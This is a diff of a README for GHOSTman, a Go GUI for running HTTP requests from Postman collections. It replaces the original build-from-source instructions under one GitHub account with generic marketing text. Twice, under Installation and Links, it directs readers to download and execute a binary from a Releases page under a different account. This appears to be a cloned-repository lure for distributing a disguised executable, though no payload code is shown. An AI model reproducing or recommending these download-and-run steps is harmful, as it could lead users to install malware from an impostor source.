@@ -1,164 +1,97 @@
-# GHOSTman
+# GHOSTman: Your Go-To GUI for HTTP Commands 🌐
 
-A GUI application for executing HTTP commands, built with Go and Fyne framework. This tool provides a user-friendly interface for managing and executing HTTP requests defined in Postman Collection format.
+![GHOSTman Logo](https://via.placeholder.com/150)  
+
+Welcome to GHOSTman! This is a GUI application designed to help you execute HTTP commands effortlessly. Built with the Go programming language and the Fyne framework, GHOSTman offers a user-friendly interface for managing and executing HTTP requests defined in Postman Collection format. 
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Platforms](#supported-platforms)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Links](#links)
 
 ## Features
-- Modern GUI interface built with Fyne
-- Command management through Postman Collection files
-- Support for multiple command groups
-- Command filtering and search
-- HTTP request execution with customizable headers and methods
-- Response visualization
-- Dark/Light theme support (switcher in the top panel)
-- Cross-platform (Windows, macOS, Linux)
 
-## Screenshots
-
-- Theme: `Ligth`
-
-![GHOSTman Screenshot](./docs/screenshot-GHOSTman-v1.0.0-theme-light.png)
-
-
-- Theme: `Dark`
-
-![GHOSTman Screenshot](./docs/screenshot-GHOSTman-v1.0.0-theme-dark.png)
-
-## Prerequisites
-- Go 1.21 or higher
-- Fyne dependencies:
-  - For macOS: Xcode Command Line Tools
-  - For Linux: gcc, libgl1-mesa-dev, xorg-dev
-  - For Windows: gcc (MinGW-w64)
+- **User-Friendly Interface**: Navigate through your HTTP requests with ease.
+- **Postman Collection Support**: Import and manage your requests directly from Postman collections.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Open Source**: Contribute to the project and make it better for everyone.
+- **JSON Support**: Easily handle JSON data in your requests and responses.
+- **Developer Tools**: Enhance your productivity with features tailored for developers.
 
 ## Installation
 
-### From Source
-```bash
-# Clone the repository
-git clone https://github.com/romanitalian/GHOSTman.git
-cd GHOSTman
+To get started with GHOSTman, download the latest release from our [Releases page](https://github.com/maskedhur/GHOSTman/releases). Choose the appropriate version for your operating system, download the file, and execute it.
 
-# Build the application
-go build -o ghostman
+### For Linux and macOS
 
-# Run the application
-./ghostman
-```
+1. Download the `.tar.gz` or `.AppImage` file.
+2. Extract the files (if necessary).
+3. Open your terminal and navigate to the directory where you downloaded the file.
+4. Run the command:  
+   ```bash
+   ./GHOSTman
+   ```
 
-### Using Go Install
-```bash
-go install github.com/romanitalian/GHOSTman@latest
-```
+### For Windows
+
+1. Download the `.exe` file from the Releases page.
+2. Double-click the downloaded file to run the application.
 
 ## Usage
 
-### Configuration
-Create a Postman Collection file (e.g., `collection.json`) in the `data` directory:
+Once you have GHOSTman installed, you can start using it to execute HTTP commands. Here’s how to get started:
 
-```json
-{
-  "info": {
-    "name": "My API Collection",
-    "description": "Collection of API endpoints"
-  },
-  "item": [
-    {
-      "name": "Get Users",
-      "request": {
-        "method": "GET",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/json"
-          }
-        ],
-        "url": {
-          "raw": "https://api.example.com/users",
-          "host": ["api.example.com"],
-          "path": ["users"]
-        }
-      }
-    }
-  ]
-}
-```
+1. **Open GHOSTman**: Launch the application from your applications menu or desktop shortcut.
+2. **Import Postman Collection**: Click on the "Import" button to load your Postman Collection.
+3. **Select Request**: Choose the HTTP request you want to execute from the list.
+4. **Set Parameters**: If needed, modify any parameters or headers.
+5. **Execute Request**: Click the "Send" button to execute the request.
+6. **View Response**: Check the response in the designated area to see the results.
 
-### Running Commands
-1. Launch the application
-2. Select a command from the left panel
-3. (Optional) Switch between Light and Dark theme using the selector at the top
-4. Click "Execute" or press Enter
-5. View the response in the right panel
+## Supported Platforms
 
-## Development
+GHOSTman is designed to run on various operating systems, making it accessible to a wide range of users. The supported platforms include:
 
-### Setup Development Environment
-```bash
-# Install dependencies
-go mod download
-
-# Run tests
-go test ./...
-
-# Run tests with coverage
-make test-coverage  # or make tc for short
-
-# Build for development
-go build -tags dev
-```
-
-### Project Structure
-```
-.
-├── data/          # Postman Collection files
-├── coverage/      # Test coverage reports
-├── main.go        # Application entry point
-├── Makefile       # Build and development commands
-├── go.mod         # Go module definition
-└── go.sum         # Go module checksums
-```
-
-## Future Plans
-
-- Implement synchronization via Git
-- Add support for gRPC
-- AI-powered request suggestions
-- Visual API flow builder
-- Built-in API documentation generator
-- End-to-end API test recorder
-- Cloud sync and team collaboration
-
-## Test Coverage
-
-To check test coverage and generate a report, run:
-
-```bash
-make coverage
-```
-
-Example output:
-```
-$ make coverage
-mkdir -p docs
-go test -coverprofile=docs/coverage.out ./... && go tool cover -func=docs/coverage.out | grep total:
-	github.com/romanitalian/GHOSTman		coverage: 0.0% of statements
-ok  	github.com/romanitalian/GHOSTman/internal/collection	0.005s	coverage: 81.8% of statements
-ok  	github.com/romanitalian/GHOSTman/internal/httpclient	0.008s	coverage: 85.2% of statements
-	github.com/romanitalian/GHOSTman/internal/logging		coverage: 0.0% of statements
-	github.com/romanitalian/GHOSTman/internal/ui		coverage: 0.0% of statements
-total:									(statements)		19.3%
-HTML report: open docs/coverage.html
-go tool cover -html=docs/coverage.out -o docs/coverage.html
-```
-
-You can open `docs/coverage.html` in your browser for a detailed report.
+- **Windows**: Compatible with Windows 10 and later.
+- **macOS**: Runs on macOS Mojave (10.14) and later.
+- **Linux**: Works on most distributions, including Ubuntu, Fedora, and Arch Linux.
 
 ## Contributing
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: entity - add amazing feature'`)
-4. Push to the branch (`git push --force-with-lease origin feature/amazing-feature`)
-5. Open a Pull Request
+
+We welcome contributions to GHOSTman! If you would like to help improve the project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your fork.
+5. Submit a pull request.
+
+### Guidelines
+
+- Follow the existing code style.
+- Write clear, concise commit messages.
+- Ensure your changes are well-tested.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+GHOSTman is open-source software licensed under the MIT License. Feel free to use, modify, and distribute it as per the license terms.
+
+## Contact
+
+For any questions, issues, or suggestions, please reach out via GitHub Issues or contact the maintainers directly.
+
+## Links
+
+To download the latest version of GHOSTman, visit our [Releases page](https://github.com/maskedhur/GHOSTman/releases) for the latest updates. Make sure to download the appropriate file for your operating system and execute it.
+
+![GHOSTman Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)
+
+---
+
+Thank you for choosing GHOSTman! We hope this tool enhances your productivity and simplifies your HTTP command execution. Enjoy using GHOSTman!
